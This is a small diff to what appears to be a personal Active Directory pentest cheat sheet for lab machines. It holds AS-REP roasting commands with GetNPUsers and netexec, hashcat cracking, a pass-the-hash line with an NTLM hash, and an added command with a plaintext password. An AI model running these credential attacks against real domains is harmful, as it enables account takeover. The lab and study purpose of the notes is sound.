@@ -97,6 +97,9 @@ netexec smb dc01.sequel.htb -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
 GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
 
 hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
+
+#Si tengo usuario autenticado
+nxc ldap 172.16.0.2 -u 'calde_ldap' -p 'CsAdlLDAPMoDeBrnd12!' --asreproast  a.txt
 ```
 
 ## Request TGS
